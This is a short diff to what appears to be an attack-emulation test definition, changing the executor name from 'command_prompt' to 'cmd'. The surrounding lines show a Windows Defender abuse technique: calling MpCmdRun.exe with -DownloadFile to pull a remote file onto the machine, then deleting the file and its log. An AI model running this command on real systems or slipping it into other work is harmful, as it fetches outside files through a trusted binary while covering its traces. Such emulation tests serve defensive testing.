@@ -27,9 +27,9 @@ steps:
       inline: |
         cd "%ProgramData%\Microsoft\Windows Defender\platform\4.18*"
         MpCmdRun.exe -DownloadFile -url {{.Args.remote_file}} -path {{.Args.local_path}}
-      executor: command_prompt
+      executor: cmd
       cleanup:
         inline: |-
             del {{.Args.local_path}} >nul 2>&1
             del %temp%\MpCmdRun.log >nul 2>&1
-        executor: command_prompt
+        executor: cmd
